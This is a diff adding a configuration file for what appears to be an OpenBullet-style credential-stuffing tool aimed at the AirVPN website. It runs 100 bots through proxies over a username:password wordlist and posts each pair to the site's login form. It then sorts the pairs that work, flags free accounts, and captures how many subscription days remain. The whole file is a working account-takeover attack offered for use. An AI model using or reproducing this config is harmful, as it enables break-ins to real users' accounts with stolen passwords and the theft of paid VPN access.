@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "Air VPN",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-05T18:58:38.4252918+02:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://airvpn.org" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_AUTH_KEY PARSE "<SOURCE>" LR "name='auth_key' value='" "'" Recursive=FALSE -> VAR "AUTHKEY" "" "" 
+#LOGIN REQUEST POST "https://airvpn.org/index.php?app=core&module=global&section=login&do=process" AutoRedirect=TRUE 
+  CONTENT "auth_key=<AUTHKEY>&referer=http%3A%2F%2Fairvpn.org%2F&ips_username=<USER>&ips_password=<PASS>&rememberMe=0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://airvpn.org/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "You are now signed in" 
+  KEYCHAIN Failure OR 
+    KEY "Username or password incorrect" 
+#GET_MEMBERSHIP_INFO REQUEST GET "https://airvpn.org/client/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#CHECK_IF_FREE KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "you are a <b>Member" 
+#CAPTURE_EXPIRATION PARSE "<SOURCE>" LR "Your subscription will expire in <b>" "<" Recursive=FALSE -> CAP "Days left" "" "" 
